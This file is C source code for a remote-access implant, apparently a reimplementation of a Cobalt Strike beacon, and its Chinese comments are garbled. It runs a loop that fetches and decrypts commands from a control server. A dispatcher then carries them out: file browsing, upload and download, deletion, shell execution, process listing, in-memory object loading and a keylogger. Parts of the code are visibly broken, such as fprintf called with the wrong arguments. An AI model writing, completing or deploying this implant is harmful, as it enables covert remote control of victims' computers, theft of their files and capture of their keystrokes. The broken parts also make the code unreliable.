#include <shobjidl.h>
#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#pragma warning(disable:4996)
#include "Config.h"
#include "Command.h"
#include "Job.h"
#include <tlhelp32.h>
#include <tchar.h>

// ��������
extern int SleepTime;
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;

VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen);
wchar_t* makeMetaData();

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* wMetaDataString = makeMetaData();
    while (1) {
        // ����������ͬʱ����ȡ��Ӧ����
        size_t responseSize = 0;
        unsigned char* responseEncodeData = GET(wMetaDataString, &responseSize);

        size_t responseDataLength = 0;

        // �����������Ҫ����һ�� NetBios ���룬һ�� XOR ���ܶ�Ӧ Mask��ΪʲôҪ��������Ϊ profile ������д��
        unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);

        // ָ�����
        size_t executeCount = 0;

        if (responseDataLength > 4) {
            fprintf(stdout, "Already Received Instructions Ready To Execute\n");

            size_t dataLength = responseDataLength;
            size_t middleDataLength = dataLength - 16; // ȥ�� HMAC Hash

            // ��ʼ����ָ�AES CBC��
            unsigned char* key = AESRandaeskey;

            size_t ivLength = strlen((char*)IV);
            size_t decryptAES_CBCdatalen;
            unsigned char* decryptAES_CBCdata = AesCBCDecrypt(responseData, key, middleDataLength, &decryptAES_CBCdatalen);

            if (decryptAES_CBCdata != NULL) {

                unsigned char* lenBytesStart = decryptAES_CBCdata + 4;
                uint8_t lenBytes[4];
                memcpy(lenBytes, lenBytesStart, 4);

                uint32_t BiglenBytes = bigEndianUint32(lenBytes);     // totalCmdLength
                unsigned char* decryptedBuf = decryptAES_CBCdata + 8; // ���������ݰ�

                while (1) {
                    if (BiglenBytes <= 0) {
                        break;
                    }

                    int callbackType = 0;

                    // ���������������������ݰ��������ֶ�
                    uint32_t commandType = 0;
                    size_t commandBuflen = 0;
                    unsigned char* commandBuf = NULL;

                    // ÿ����һ��ָ�� BiglenBytes �����һ����Ӧָ��ĳ���
                    commandBuf = parsePacket(decryptedBuf, &BiglenBytes, &commandType, &commandBuflen, &executeCount);

                    executeCommand(commandBuf, commandType, commandBuflen);
                }

                // һ�������ȡ��ȫ��ָ����Ѿ�ִ����� ��ʼ free
                free(decryptAES_CBCdata);
                decryptAES_CBCdata = NULL;
            }
        }

        Sleep(SleepTime);
    }

    free(wMetaDataString);
}

int main() {
    beacon_main();
    return 0;
}

wchar_t* makeMetaData() {
    EncryMetadataResult EncryMetainfos = EncryMetadata();
    unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;

    char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);

    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);

    unsigned char* headerstart = (unsigned char*)malloc(headers_length + 1); // +1 Ϊ�˴���ַ���������'\0'
    memcpy(headerstart, metadata_header, strlen(metadata_header));
    memcpy(headerstart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
    headerstart[headers_length] = '\0'; // ȷ���� headers ĩβ����ַ���������

    //header[] = "Cookie: SESSIONID=";
    char* concatenatedString = (char*)malloc(strlen(headerstart) + strlen(baseEncodeMetadata) + 1);
    strcpy(concatenatedString, headerstart);

    strcat(concatenatedString, baseEncodeMetadata);

    // ת��Ϊ���ַ�
    int wideLen = MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, NULL, 0);
    wchar_t* wConcatenatedString = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
    if (!wConcatenatedString) {
        fprintf("Memory allocatin failed", GetLastError());
        free(concatenatedString);
        return;
    }
    MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, wConcatenatedString, wideLen);
    wcscat(wConcatenatedString, L"\r\n"); // �������ͷ��β

    free(headerstart);
    free(baseEncodeMetadata);
    free(concatenatedString);

    return wConcatenatedString;
}

 VOID executeCommand(unsigned char* commandBuf, uint32_t commandType, size_t commandBuflen) {
    unsigned char* buff = NULL;  // �˲������� DataProcess
    size_t Bufflen = 0;          // �˲������� DataProcess
    int callbackType = 0;        // �˲������� DataProcess ����ʹ�� DWORD ��ʾ �����з��� 

    switch (commandType)
    {
    case CMD_TYPE_SLEEP:         // 1
        CmdChangSleepTimes(commandBuf);
        callbackType = 0;
        break;
    case CMD_TYPE_FILE_BROWSE:   // 1
        callbackType = 22;
        buff = CmdFileBrowse(commandBuf, &Bufflen);
        break;
    case CMD_TYPE_UPLOAD_START:  // 1
        buff = CmdUpload(commandBuf, &commandBuflen, &Bufflen, 1);
        callbackType = -1;
        break;
    case CMD_TYPE_UPLOAD_LOOP:   // 1
        buff = CmdUpload(commandBuf, &commandBuflen, &Bufflen, 2);
        callbackType = -1;
        break;
    case  CMD_TYPE_DRIVES:       // 1
        callbackType = 22;
        buff = CmdDrives(commandBuf, &Bufflen);
        break;
    case  CMD_TYPE_MKDIR: // 1 
        callbackType = 0;
        buff = CmdMkdir(commandBuf, &commandBuflen, &Bufflen);
        break;
    case CMD_TYPE_PWD:    // 1
        callbackType = 0;
        buff = CmdPwd(commandBuf, &Bufflen);
        break;
    case CMD_TYPE_GETUID: //1
        callbackType = 0;
        buff = CmdGetUid(commandBuf, &Bufflen);
        break;
    case CMD_TYPE_RM:     // 1
        callbackType = 0;
        buff = CmdFileRemove(commandBuf, &commandBuflen, &Bufflen);
        break;
    case CMD_TYPE_DOWNLOAD: // 1
        callbackType = 0;
        buff = CmdFileDownload(commandBuf, &commandBuflen, &Bufflen);
        break;
    case CMD_TYPE_SHELL:
        callbackType = 0;
        buff = CmdShell(commandBuf, &commandBuflen, &Bufflen);
        break;
    case CMD_TYPE_Jobs:
        callbackType = -1;
        beacon_jobs();
        break;
    case CMD_TYPE_Jobskill:
        callbackType = -1;
        beacon_JobKill(commandBuf, &Bufflen);;
        break;
    case CMD_TYPE_BOF:  // 1
        callbackType = -1;
        CmdBeaconBof(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_EXIT: // 0
        exit(-1);
    case CMD_TYPE_PIPE:
        callbackType = -1;
        PipeJob(commandBuf, &commandBuflen, &Bufflen);
        break;
    case CMD_TYPE_PS:  // 1
        callbackType = -1;
        CmdPs(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = -1;
        exit(-1);
        // BeaconSpawn(commandBuf, &commandBuflen);
        break;
    case CMD_TYPE_KEYLOGGER:
        callbackType = -1;
        KEYLOGGEJob(0, commandBuf, &commandBuflen, 1);
        break;
    default:
        callbackType = 0;
        unsigned char* result = "[-] This Command Not Accomplish";
        unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
        memcpy(resultMemmory, result, strlen(result) + 1);
        buff = resultMemmory;
        Bufflen = strlen(result);
        break;
    }

    free(commandBuf);

    if (callbackType >= 0 && buff) {
        DataProcess(buff, Bufflen, callbackType);
        free(buff);
    }
}
